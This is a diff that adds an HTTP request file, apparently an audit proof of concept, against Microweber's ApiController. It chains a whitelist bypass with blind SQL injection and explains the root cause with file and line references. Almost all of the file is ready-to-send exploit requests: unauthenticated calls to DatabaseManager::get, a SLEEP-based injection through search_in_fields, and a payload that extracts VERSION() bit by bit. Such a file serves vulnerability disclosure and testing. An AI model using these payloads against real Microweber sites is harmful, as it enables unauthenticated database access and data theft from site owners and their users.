@@ -1,0 +1,62 @@
+### F-003 + F-001: ApiController Whitelist Bypass → SQL Injection
+### Severity: CRITICAL | Auth: None | Method: POST
+### Impact: Unauthenticated access to any pre-loaded class method + SQL injection
+###
+### STEP 1 — Verify whitelist bypass (F-003)
+### DatabaseManager is always pre-loaded (ApiController loads it at line 78)
+### This call bypasses api_exposed whitelist entirely via class_is_already_here branch
+
+POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 32
+
+table=content&limit=3&no_cache=1
+
+### EXPECTED: JSON array of content rows — proves whitelist bypass
+### (DatabaseManager::get() is NOT in api_exposed whitelist)
+
+---
+
+### STEP 2 — SQL Injection via search_in_fields (F-001)
+### orWhereRaw('LOWER(`' . $field . '`) LIKE ?') — field name from user input
+### Inject into backtick context to escape and add malicious SQL
+
+POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 72
+
+table=content&search=a&search_in_fields=title`)+OR+SLEEP(3)--
+
+### EXPECTED: Response delayed ~3 seconds → confirms blind SQLi
+### Time-based because backtick doubling in orWhere() calls may abort UNION-based
+
+---
+
+### STEP 3 — Extract DB version (time-based blind, bit-by-bit)
+### Confirm SQL injection is real by extracting first byte of version()
+
+POST /api/MicroweberPackages/Database/DatabaseManager/get HTTP/1.1
+Host: localhost:8888
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+Connection: close
+Content-Length: 100
+
+table=content&search=a&search_in_fields=title`)+AND+IF(ORD(SUBSTR(VERSION(),1,1))>53,SLEEP(3),0)--
+
+### IF response delayed: first char of version() > '5' (ASCII 53) → true (MySQL 8.x)
+### IF no delay: false → try different threshold
+###
+### WHY IT WORKS:
+###   ApiController.php:109: class_exists('MicroweberPackages\Database\DatabaseManager', false)
+###   → true (DatabaseManager loaded at line 78 for escape_string())
+###   → branch 'class_is_already_here' at line 245-298
+###   → return at line 298 BEFORE whitelist check at line 331/420
+###   QueryFilter.php:374: orWhereRaw('LOWER(`' . $to_search_in_field . '`) LIKE ?')
+###   → $to_search_in_field from $params['search_in_fields'] with only explode(',') sanitization
